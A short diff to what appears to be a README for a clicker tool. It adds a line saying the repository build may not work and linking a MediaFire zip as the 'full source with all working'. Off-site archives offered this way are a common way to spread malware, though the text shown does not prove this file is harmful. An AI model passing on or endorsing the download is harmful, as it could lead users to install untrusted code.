@@ -9,4 +9,6 @@ you can edit or use that for base for your clicker.
 
 Remember if you edit the code and publish it you need to tag me for not getting copyrighted.
 
+If you build the clicker and it dosent work thats my bad becouse am wanted to add source on github (files too big). Full source with all working:https://www.mediafire.com/file/jfaa4wcbtqeqnqr/Nort.zip/file
+
 # Have Fun!
